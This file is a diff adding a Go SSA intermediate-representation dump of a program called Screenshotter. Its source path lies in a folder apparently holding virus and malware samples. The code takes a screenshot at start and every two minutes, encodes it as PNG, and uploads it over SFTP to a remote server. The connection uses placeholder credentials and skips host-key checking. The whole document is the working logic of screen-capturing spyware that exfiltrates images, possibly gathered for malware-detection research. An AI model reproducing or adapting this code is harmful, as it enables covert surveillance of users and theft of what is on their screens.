@@ -1,0 +1,188 @@
+# Name: command-line-arguments.init
+# Package: command-line-arguments
+# Synthetic: package initializer
+func init():
+0:                                                                entry P:0 S:2
+	t0 = *init$guard                                                   bool
+	if t0 goto 2 else 1
+1:                                                           init.start P:1 S:1
+	*init$guard = true:bool
+	t1 = github.com/vova616/screenshot.init()                            ()
+	t2 = fmt.init()                                                      ()
+	t3 = time.init()                                                     ()
+	t4 = github.com/pkg/sftp.init()                                      ()
+	t5 = golang.org/x/crypto/ssh.init()                                  ()
+	t6 = log.init()                                                      ()
+	t7 = bytes.init()                                                    ()
+	t8 = image/png.init()                                                ()
+	jump 2
+2:                                                            init.done P:2 S:0
+	return
+
+# Name: command-line-arguments.uploadscreenshot
+# Package: command-line-arguments
+# Location: C:\Users\林文秋\Downloads\goTest\病毒恶意软件\Golang 病毒示例\Screenshotter\main.go:14:7
+# Recover: 3
+func uploadscreenshot(imagestr []byte):
+0:                                                                entry P:0 S:2
+	t0 = connect("username":string, "password":string, "server":string, 22:int) (*github.com/pkg/sftp.Client, error)
+	t1 = extract t0 #0                          *github.com/pkg/sftp.Client
+	t2 = extract t0 #1                                                error
+	t3 = t2 != nil:error                                               bool
+	if t3 goto 1 else 2
+1:                                                              if.then P:1 S:1
+	t4 = new [1]any (varargs)                                       *[1]any
+	t5 = &t4[0:int]                                                    *any
+	t6 = change interface any <- error (t2)                             any
+	*t5 = t6
+	t7 = slice t4[:]                                                  []any
+	t8 = log.Fatal(t7...)                                                ()
+	jump 2
+2:                                                              if.done P:2 S:1
+	t9 = &t1.clientConn [#0]                *github.com/pkg/sftp.clientConn
+	defer (*github.com/pkg/sftp.clientConn).Close(t9)
+	t10 = (*github.com/pkg/sftp.Client).Walk(t1, "/tmp":string) *github.com/kr/fs.Walker
+	jump 6
+3:                                                              recover P:0 S:0
+	return
+4:                                                             for.body P:1 S:1
+	t11 = (*github.com/kr/fs.Walker).Err(t10)                         error
+	t12 = t11 != nil:error                                             bool
+	jump 6
+5:                                                             for.done P:1 S:2
+	t13 = time.Now()                                              time.Time
+	t14 = (time.Time).Format(t13, "Monday, 02-Jan-06...":string)     string
+	t15 = new [1]any (varargs)                                      *[1]any
+	t16 = &t15[0:int]                                                  *any
+	t17 = make any <- string (t14)                                      any
+	*t16 = t17
+	t18 = slice t15[:]                                                []any
+	t19 = fmt.Sprintf("/tmp/%s.png":string, t18...)                  string
+	t20 = new [1]any (varargs)                                      *[1]any
+	t21 = &t20[0:int]                                                  *any
+	t22 = make any <- string (t19)                                      any
+	*t21 = t22
+	t23 = slice t20[:]                                                []any
+	t24 = fmt.Println(t23...)                            (n int, err error)
+	t25 = (*github.com/pkg/sftp.Client).Create(t1, t19) (*github.com/pkg/sftp.File, error)
+	t26 = extract t25 #0                          *github.com/pkg/sftp.File
+	t27 = extract t25 #1                                              error
+	t28 = t27 != nil:error                                             bool
+	if t28 goto 7 else 8
+6:                                                             for.loop P:2 S:2
+	t29 = (*github.com/kr/fs.Walker).Step(t10)                         bool
+	if t29 goto 4 else 5
+7:                                                              if.then P:1 S:1
+	t30 = new [1]any (varargs)                                      *[1]any
+	t31 = &t30[0:int]                                                  *any
+	t32 = change interface any <- error (t27)                           any
+	*t31 = t32
+	t33 = slice t30[:]                                                []any
+	t34 = log.Fatal(t33...)                                              ()
+	jump 8
+8:                                                              if.done P:2 S:2
+	t35 = (*github.com/pkg/sftp.File).Write(t26, imagestr)     (int, error)
+	t36 = extract t35 #0                                                int
+	t37 = extract t35 #1                                              error
+	t38 = t37 != nil:error                                             bool
+	if t38 goto 9 else 10
+9:                                                              if.then P:1 S:1
+	t39 = new [1]any (varargs)                                      *[1]any
+	t40 = &t39[0:int]                                                  *any
+	t41 = change interface any <- error (t37)                           any
+	*t40 = t41
+	t42 = slice t39[:]                                                []any
+	t43 = log.Fatal(t42...)                                              ()
+	jump 10
+10:                                                             if.done P:2 S:0
+	rundefers
+	return
+
+# Name: command-line-arguments.connect
+# Package: command-line-arguments
+# Location: C:\Users\林文秋\Downloads\goTest\病毒恶意软件\Golang 病毒示例\Screenshotter\main.go:45:6
+func connect(user string, password string, host string, port int) (*github.com/pkg/sftp.Client, error):
+0:                                                                entry P:0 S:2
+	t0 = new [0]golang.org/x/crypto/ssh.AuthMethod (makeslice) *[0]golang.org/x/crypto/ssh.AuthMethod
+	t1 = slice t0[:0:int]              []golang.org/x/crypto/ssh.AuthMethod
+	t2 = golang.org/x/crypto/ssh.Password(password) golang.org/x/crypto/ssh.AuthMethod
+	t3 = new [1]golang.org/x/crypto/ssh.AuthMethod (varargs) *[1]golang.org/x/crypto/ssh.AuthMethod
+	t4 = &t3[0:int]                     *golang.org/x/crypto/ssh.AuthMethod
+	*t4 = t2
+	t5 = slice t3[:]                   []golang.org/x/crypto/ssh.AuthMethod
+	t6 = append(t1, t5...)             []golang.org/x/crypto/ssh.AuthMethod
+	t7 = new golang.org/x/crypto/ssh.ClientConfig (complit) *golang.org/x/crypto/ssh.ClientConfig
+	t8 = &t7.User [#1]                                              *string
+	t9 = &t7.HostKeyCallback [#3]  *golang.org/x/crypto/ssh.HostKeyCallback
+	t10 = golang.org/x/crypto/ssh.InsecureIgnoreHostKey() golang.org/x/crypto/ssh.HostKeyCallback
+	t11 = &t7.Auth [#2]               *[]golang.org/x/crypto/ssh.AuthMethod
+	t12 = &t7.Timeout [#7]                                   *time.Duration
+	*t8 = user
+	*t9 = t10
+	*t11 = t6
+	*t12 = 30000000000:time.Duration
+	t13 = new [2]any (varargs)                                      *[2]any
+	t14 = &t13[0:int]                                                  *any
+	t15 = make any <- string (host)                                     any
+	*t14 = t15
+	t16 = &t13[1:int]                                                  *any
+	t17 = make any <- int (port)                                        any
+	*t16 = t17
+	t18 = slice t13[:]                                                []any
+	t19 = fmt.Sprintf("%s:%d":string, t18...)                        string
+	t20 = golang.org/x/crypto/ssh.Dial("tcp":string, t19, t7) (*golang.org/x/crypto/ssh.Client, error)
+	t21 = extract t20 #0                    *golang.org/x/crypto/ssh.Client
+	t22 = extract t20 #1                                              error
+	t23 = t22 != nil:error                                             bool
+	if t23 goto 1 else 2
+1:                                                              if.then P:1 S:0
+	return nil:*github.com/pkg/sftp.Client, t22
+2:                                                              if.done P:1 S:2
+	t24 = github.com/pkg/sftp.NewClient(t21, nil:[]github.com/pkg/sftp.ClientOption...) (*github.com/pkg/sftp.Client, error)
+	t25 = extract t24 #0                        *github.com/pkg/sftp.Client
+	t26 = extract t24 #1                                              error
+	t27 = t26 != nil:error                                             bool
+	if t27 goto 3 else 4
+3:                                                              if.then P:1 S:0
+	return nil:*github.com/pkg/sftp.Client, t26
+4:                                                              if.done P:1 S:0
+	return t25, nil:error
+
+# Name: command-line-arguments.main
+# Package: command-line-arguments
+# Location: C:\Users\林文秋\Downloads\goTest\病毒恶意软件\Golang 病毒示例\Screenshotter\main.go:77:7
+func main():
+0:                                                                entry P:0 S:1
+	t0 = takescreenshot()                                                ()
+	t1 = time.NewTicker(120000000000:time.Duration)            *time.Ticker
+	t2 = &t1.C [#0]                                       *<-chan time.Time
+	t3 = *t2                                               <-chan time.Time
+	jump 1
+1:                                                       rangechan.loop P:2 S:2
+	t4 = <-t3,ok                                     (k time.Time, ok bool)
+	t5 = extract t4 #1                                                 bool
+	if t5 goto 2 else 3
+2:                                                       rangechan.body P:1 S:1
+	t6 = extract t4 #0                                            time.Time
+	t7 = takescreenshot()                                                ()
+	jump 1
+3:                                                       rangechan.done P:1 S:0
+	return
+
+# Name: command-line-arguments.takescreenshot
+# Package: command-line-arguments
+# Location: C:\Users\林文秋\Downloads\goTest\病毒恶意软件\Golang 病毒示例\Screenshotter\main.go:85:7
+func takescreenshot():
+0:                                                                entry P:0 S:0
+	t0 = github.com/vova616/screenshot.CaptureScreen() (*image.RGBA, error)
+	t1 = extract t0 #0                                          *image.RGBA
+	t2 = extract t0 #1                                                error
+	t3 = t2 != nil:error                                               bool
+	t4 = new bytes.Buffer (new)                               *bytes.Buffer
+	t5 = make io.Writer <- *bytes.Buffer (t4)                     io.Writer
+	t6 = make image.Image <- *image.RGBA (t1)                   image.Image
+	t7 = image/png.Encode(t5, t6)                                     error
+	t8 = (*bytes.Buffer).Bytes(t4)                                   []byte
+	t9 = uploadscreenshot(t8)                                            ()
+	return
+
